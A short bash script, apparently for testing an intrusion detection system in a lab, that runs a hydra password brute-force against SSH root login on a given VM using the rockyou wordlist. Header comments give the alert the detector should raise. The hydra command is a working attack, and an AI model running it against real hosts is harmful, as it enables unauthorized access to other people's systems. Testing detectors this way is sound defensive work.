#!/bin/bash
# brute_force.sh — Brute-force attack using hydra
# Expected result:
#   EARLY_ALERT[BRUTE_FORCE] at attempt#6 (deterministic)
#   → FINAL KNOWN_ATTACK (Brute-force, class=3) + beep
#
# Usage: ./brute_force.sh <Ubuntu_VM_IP>

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <Ubuntu_VM_IP>"
    exit 1
fi

echo "[*] Brute-force attack on $TARGET (root via hydra + rockyou.txt)..."
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$TARGET
echo "[*] Done."
